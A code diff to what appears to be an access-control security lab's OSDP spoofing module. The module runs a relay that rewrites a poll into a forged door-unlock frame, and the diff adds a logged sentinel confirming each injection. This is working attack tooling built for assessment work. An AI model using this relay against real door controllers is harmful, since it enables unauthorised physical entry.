@@ -72,6 +72,11 @@ _READ_SIZE = 4096
 # ``inject`` half of ``run_spoof``'s contract). Created via ``docker compose exec ... touch``.
 _TRIGGER_PATH = Path("/tmp/interlock-spoof-fire")
 
+# The line a relay prints (flushed) each time it puts the forged CMD_OUT on the bus. The
+# assessment reads it from the attacker log as proof the forged frame reached the bus, so a
+# missing unlock only counts as a clean result when this line is there.
+INJECT_SENTINEL = "interlock: injected CMD_OUT"
+
 # A zero-arg trigger that performs one injection attempt (lab: blocks on the live MITM;
 # --physical: writes one crafted frame to the consented serial segment).
 Inject = Callable[[], None]
@@ -126,7 +131,16 @@ def craft_card_event(address: int, card_bytes: bytes, *, sequence: int) -> bytes
     return codec.encode(frame)
 
 
-def unlock_transform(*, armed: Callable[[], bool] = lambda: True) -> Transform:
+def announce_inject(sequence: int) -> None:
+    """Print ``INJECT_SENTINEL`` with the injected frame's sequence number, flushed at once."""
+    print(f"{INJECT_SENTINEL} seq={sequence}", flush=True)
+
+
+def unlock_transform(
+    *,
+    armed: Callable[[], bool] = lambda: True,
+    on_inject: Callable[[int], None] | None = None,
+) -> Transform:
     """Return a one-shot ``Transform`` that rewrites the first cp->pd ``CMD_POLL`` into an unlock.
 
     Buffers bytes per direction (Pitfall 5: a single chunk is not guaranteed to be a whole
@@ -141,6 +155,10 @@ def unlock_transform(*, armed: Callable[[], bool] = lambda: True) -> Transform:
     and ``--physical`` shape, where the attacker wants the unlock as soon as possible). The live
     lab driver passes a controllable predicate (a trigger-file check) so a test can observe a
     genuinely locked baseline before arming the injection.
+
+    ``on_inject``, when given, is called exactly once, with the rewritten POLL's sequence
+    number, right after the forged frame replaces it. The lab relays pass ``announce_inject``
+    so the attacker log proves the injection happened.
     """
     buffers: dict[Direction, bytearray] = {
         Direction.cp_to_pd: bytearray(),
@@ -169,6 +187,8 @@ def unlock_transform(*, armed: Callable[[], bool] = lambda: True) -> Transform:
                     sequence = frame.control & constants.PKT_CONTROL_SQN
                     out += craft_unlock(frame.address, sequence=sequence)
                     injected = True
+                    if on_inject is not None:
+                        on_inject(sequence)
                     continue
             out += raw
         return bytes(out)
@@ -242,7 +262,8 @@ def main() -> None:
     Run by the ``docker-compose.spoof.yml`` override as
     ``python -m interlock.osdp.attacks.spoof``. The injection only arms once ``_TRIGGER_PATH``
     exists (``docker compose exec ... touch``), so a live test can confirm the PD stays locked
-    beforehand and attribute the transition to an explicit ``inject()`` call.
+    beforehand and attribute the transition to an explicit ``inject()`` call. Each injection
+    is announced with ``INJECT_SENTINEL`` on stdout, which compose keeps as the attacker log.
     """
     upstream = _upstream()
     print(
@@ -250,7 +271,9 @@ def main() -> None:
         f"upstream={upstream[0]}:{upstream[1]}",
         flush=True,
     )
-    TCPTap(_LAB_PORT, upstream).serve_rewrite(unlock_transform(armed=_TRIGGER_PATH.exists))
+    TCPTap(_LAB_PORT, upstream).serve_rewrite(
+        unlock_transform(armed=_TRIGGER_PATH.exists, on_inject=announce_inject)
+    )
 
 
 def _serial_unlock_relay(cp_endpoint: object, pd_endpoint: object) -> None:
